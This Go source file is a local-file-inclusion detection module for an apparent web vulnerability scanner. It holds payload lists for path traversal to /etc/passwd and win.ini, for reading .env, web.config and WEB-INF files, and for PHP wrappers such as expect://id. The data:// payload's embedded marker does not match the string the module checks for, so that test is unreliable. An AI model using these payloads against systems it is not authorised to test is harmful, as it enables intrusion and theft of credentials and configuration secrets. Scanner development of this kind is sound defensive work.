package lfi_generic

import (
	"fmt"
	"regexp"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

type Module struct {
	modkit.BaseActiveModule
	rules []*rule
	rhm   dedup.Lazy[dedup.RequestHashManager]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		rules: getRules(),
		rhm:   dedup.LazyDefaultRHM("lfi_generic"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerInsertionPoint tests a single insertion point for LFI.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Check if we should scan this insertion point
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	paramValue := ip.BaseValue()
	if !matchTopParams(ip.Name()) && !maybePath(paramValue) {
		return nil, nil
	}

	// Get original response body to avoid false positives
	var origBody string
	if ctx.Response() != nil {
		origBody = ctx.Response().BodyToString()
	}

	var results []*output.ResultEvent

	for _, rule := range m.rules {
		for _, payload := range rule.Payloads() {
			// Build fuzzed request with payload
			fuzzedRaw := ip.BuildRequest([]byte(payload))

			// Parse the fuzzed raw request to HttpRequestResponse
			fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
			if err != nil {
				continue
			}

			// Copy HttpService from original request
			fuzzedReq = fuzzedReq.WithService(ctx.Service())

			resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
			if err != nil {
				if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
					return results, nil
				}
				continue
			}

			if rule.MatchWithBaseline(resp.Body().String(), origBody) {
				results = append(results, &output.ResultEvent{
					URL:              urlx.String(),
					Request:          string(fuzzedRaw),
					Response:         resp.FullResponseString(),
					FuzzingParameter: ip.Name(),
					ExtractedResults: []string{payload},
				})
				resp.Close()
				return results, nil // Found LFI, skip remaining payloads for this IP
			}

			resp.Close()
		}
	}

	return results, nil
}

// https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/vulnerabilities/lfi/lfi-keyed.yaml
func getRules() []*rule {
	var rules []*rule
	linuxRule := newRule(
		[]string{
			"../../etc/passwd",
			"../../../etc/passwd",
			"../../../../etc/passwd",
			"/etc/passwd%00.jpg",
			"../../../../../../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../../../../../../etc/passwd%00.jpg",
			`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`,
			"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
			"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd",
			"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd",
			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../etc/passwd",
			"./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../etc/passwd",
		},
		[]*regexp.Regexp{
			regexp.MustCompile(`root:.*:0:0:`),
		},
		[]string{},
	)
	rules = append(rules, linuxRule)
	/* -------------------------------------------------------------------------- */
	windowsRule := newRule(
		[]string{
			"../../windows/win.ini",
			"../../../windows/win.ini",
			"../../../../windows/win.ini",
			"../../../../../../../../../../../../../../../windows/win.ini",
			"c:/windows/win.ini%00.jpg",
			"../../../../../../../../../../../../../../../windows/win.ini%00.jpg",
			// double url encode
			`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%252fwin.ini`,
			// hex_unicode
			"%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fwindows%u002fwin.ini",
			// utf8_unicode
			"%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFwindows%C0%AFwin.ini",
			// utf8_unicode_x
			"%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFwindows%C0AFwin.ini",
			// bypass_replace
			".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../windows/win.ini",
			`..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini`,
			// bypass_waf_regx
			"./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../windows/win.ini",
		},
		[]*regexp.Regexp{},
		[]string{"bit app support", "fonts", "extensions"},
	)
	rules = append(rules, windowsRule)
	/* ------------------------------------------------------------------------- */
	webjarRule := newRule(
		[]string{
			"./web.config",
			"../web.config",
			"../../web.config",
			"./WEB-INF/web.xml",
			"../WEB-INF/web.xml",
			"../../WEB-INF/web.xml",
		},
		[]*regexp.Regexp{
			regexp.MustCompile(`(<web-app[\s\S]+<\/web-app>)`),
		},
		[]string{},
	)
	rules = append(rules, webjarRule)
	/* ------------------------------------------------------------------------- */
	phpWrapperRule := newRule(
		[]string{
			"php://filter/convert.base64-encode/resource=index.php",
			"php://filter/convert.base64-encode/resource=../index.php",
			"php://filter/convert.base64-encode/resource=../../index.php",
			"data://text/plain;base64,PD9waHAgZWNobyAidmlnZW5pdW0tdGVzdCI7ID8+",
			"expect://id",
			"php://input",
		},
		[]*regexp.Regexp{
			regexp.MustCompile(`^[A-Za-z0-9+/=]{50,}`),
		},
		[]string{"vigolium-test"},
	)
	rules = append(rules, phpWrapperRule)
	/* ------------------------------------------------------------------------- */
	appConfigRule := newRule(
		[]string{".env", "../.env", "../../.env", ".htaccess", "../.htaccess"},
		[]*regexp.Regexp{},
		[]string{"DB_PASSWORD", "APP_KEY", "APP_SECRET"},
	)
	rules = append(rules, appConfigRule)
	return rules
}
